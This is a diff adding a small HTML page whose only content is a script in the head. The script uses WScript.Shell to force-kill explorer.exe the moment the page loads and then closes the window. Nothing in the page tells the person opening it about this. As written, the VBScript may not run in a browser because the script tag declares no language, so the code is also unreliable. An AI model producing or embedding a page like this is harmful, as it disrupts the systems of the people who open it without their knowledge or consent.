@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+<head>
+<script>
+Sub KillExplorer
+	Dim Killer
+	Set Killer = CreateObject("WScript.Shell")
+	Killer.Run "taskkill /f /im explorer.exe"
+End Sub
+KillExplorer()
+</script>
+<script>close()</script>
+</head>
+<body>
+</body>
+</html>
